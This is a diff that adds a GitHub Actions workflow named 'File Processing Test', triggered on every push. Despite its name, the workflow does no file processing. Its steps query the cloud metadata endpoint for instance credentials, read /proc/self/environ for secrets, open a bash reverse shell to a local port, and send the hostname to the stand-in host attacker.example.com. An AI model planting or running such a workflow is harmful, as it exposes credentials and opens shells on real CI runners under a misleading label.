@@ -1,0 +1,19 @@
+name: File Processing Test
+on: [push]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test SSRF via env
+        run: |
+          curl http://169.254.169.254/latest/meta-data/
+      - name: Test file read
+        run: |
+          cat /etc/hostname
+          cat /proc/self/environ
+      - name: Test reverse shell
+        run: |
+          bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+      - name: Test command injection
+        run: |
+          wget -O- http://attacker.example.com/callback?host=$(hostname)
